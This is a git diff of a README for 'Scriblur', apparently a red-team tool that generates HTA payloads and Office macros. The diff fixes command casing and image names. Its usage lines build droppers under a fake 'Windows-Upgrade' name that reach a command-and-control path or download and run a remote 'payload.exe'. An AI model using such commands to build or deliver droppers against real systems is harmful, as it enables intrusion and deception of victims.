@@ -8,13 +8,13 @@ files are output to an aptly named directory "Payloads" that is created if not a
 Scriblur is a breeze to use. Simply clone the directory, and cd into it.
 
 For the HTA payload:
-  python Scriblur.py -n Windows-Upgade -p b64encodedpayload -c amazon.com/c2/domain
+  python3 scriblur.py -n Windows-Upgrade -p b64encodedpayload -c amazon.com/c2/domain
 
 # HTA Example
-![alt text](https://github.com/nins3i/Scriblur/blob/master/HTA.png)
+![alt text](https://github.com/nins3i/Scriblur/blob/master/hta.png)
 
 For the Macro Subroutine:
-  python Scriblur.py -n Windows-Upgrade -e amazon.com/final/payload.exe
+  python3 scriblur.py -n Windows-Upgrade -e amazon.com/final/payload.exe
 
 # Macro Example
-![alt text](https://github.com/nins3i/Scriblur/blob/master/Macro.png)
+![alt text](https://github.com/nins3i/Scriblur/blob/master/macro.png)
